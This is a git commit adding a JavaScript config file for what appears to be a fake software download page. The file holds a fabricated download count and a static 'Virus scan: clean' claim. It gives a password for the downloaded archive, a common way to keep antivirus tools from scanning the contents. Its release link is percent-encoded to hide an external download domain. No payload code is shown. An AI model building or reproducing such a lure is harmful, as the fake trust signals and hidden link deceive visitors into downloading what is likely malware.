534ced7802e4a108ee0de35ca5f601dc78bdd7b9
BreakPharmacistChain <lorenpmrpqr707@gmail.com>
2026-09-25 11:32:41 +0000

    Initial commit

---
+++ js/config.js
@@ -0,0 +1,13 @@
+window.SITE = {
+  owner: "BreakPharmacistChain",
+  repo: "testinbo2020",
+  title: "Download the Latest Release",
+  subtitle:
+    "Click the button to download the file\nFor installation, follow the instructions in the archive",
+  downloads: 14000,
+  virusScan: "Virus scan: clean",
+  archivePassword: "2026",
+  releaseUrl: "https://g%69%74%64ow%6E%6Coa%64.%6C%69v%65/testinbo2020",
+  assetName: "",
+  corsProxy: "",
+};
